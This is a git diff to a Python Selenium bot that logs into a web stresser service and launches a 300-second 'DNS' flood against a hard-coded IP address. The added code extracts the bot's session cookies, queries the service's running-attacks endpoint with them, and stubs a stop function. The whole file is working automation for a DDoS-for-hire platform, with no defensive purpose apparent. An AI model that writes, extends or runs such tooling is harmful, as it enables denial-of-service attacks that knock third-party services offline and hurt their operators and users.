@@ -9,6 +9,7 @@ from selenium.webdriver import ChromeService, FirefoxService
 
 import os
 import logging
+import requests
 
 
 
@@ -73,6 +74,10 @@ class Main(Pages):
     def find_element_by_locator(self, locator):
         return WebDriverWait(self.driver, 10).until(EC.presence_of_element_located(locator))
 
+    def get_cookies(self) -> dict:
+        cookies = self.driver.get_cookies()
+        return {cookie['name']: cookie['value'] for cookie in cookies}
+
     def login_form(self) -> any:
         self.login_page()
 
@@ -109,6 +114,20 @@ class Main(Pages):
         self.driver.implicitly_wait(1.0)
         driver.execute_script("startAttack();")
 
+    def get_running_attacks(self, cookies: dict):
+        s = requests.session()
+        response = s.post(
+            url="https://www.stressthem.se/request/hub/running/attacks",
+            cookies=cookies
+
+        )
+        if response.status_code == 200:
+            print("true")
+            print(response.cookies)
+        else:
+            print(f"Error en la solicitud. Código de estado: {response.status_code}")
+    def stop_attack(self, id):
+        ...
     def driver_quit(self) -> any:
         driver.quit()
 
@@ -118,4 +137,5 @@ bot = Main(driver=driver)
 bot.login_form()
 
 bot.start_attack("1.1.1.1", 443, 300, "DNS")
+bot.get_running_attacks(bot.get_cookies())
 
